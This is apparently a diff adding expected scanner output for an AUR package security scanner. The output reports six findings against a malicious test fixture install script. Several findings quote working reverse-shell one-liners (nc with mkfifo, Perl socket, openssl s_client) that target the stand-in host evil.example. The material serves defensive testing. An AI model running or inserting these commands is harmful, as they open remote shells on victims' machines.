@@ -1,0 +1,53 @@
+
+Scan Results: netutil-bin
+============================================================
+
+[CRITICAL] EXFIL-002 Netcat data transfer (install script)
+    Using netcat to transfer data externally
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install:3
+    Code:   mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.example 4444 > /tmp/f
+    Recommendation: Netcat should not be piping data in build scripts
+    Reference: CWE-200
+
+[CRITICAL] SHELL-005 Perl reverse shell (install script)
+    A Perl socket reverse shell (Socket + connect/exec).
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install:2
+    Code:   perl -e 'use Socket;$i="evil.example";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton($i)));exec("/bin/sh -i");'
+    Recommendation: Do not build. This is a remote shell.
+    Reference: CWE-94
+
+[CRITICAL] SHELL-009 OpenSSL-encrypted reverse shell (install script)
+    openssl s_client used as an encrypted C2 channel.
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install:4
+    Code:   openssl s_client -quiet -connect evil.example:4443 | /bin/sh
+    Recommendation: Do not build. This is an encrypted remote shell.
+    Reference: CWE-94
+
+[CRITICAL] SHELL-010 Named-pipe (mkfifo) reverse shell (install script)
+    mkfifo paired with nc/openssl/ /dev/tcp — the classic backpipe reverse shell that evades `nc -e` detection.
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install:3
+    Code:   mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.example 4444 > /tmp/f
+    Recommendation: Do not build. This is a remote shell.
+    Reference: CWE-94
+
+[HIGH] HIDDEN-002 Tmp directory execution (install script)
+    Executing from /tmp is suspicious. CHAOS RAT placed binary in /tmp.
+    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install:3
+    Code:   mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.example 4444 > /tmp/f
+    Recommendation: Packages should not execute from /tmp
+
+[HIGH] CHK-005 All non-VCS sources use SKIP checksum
+    No integrity verification is performed on 1 non-VCS source(s)
+    Recommendation: Provide real checksums for non-VCS sources
+    Reference: CWE-354
+
+
+
+============================================================
+Package: netutil-bin v1.0.0-1
+Scan duration: 3ms
+
+Found 6 issue(s):
+  4 CRITICAL
+  2 HIGH
+============================================================
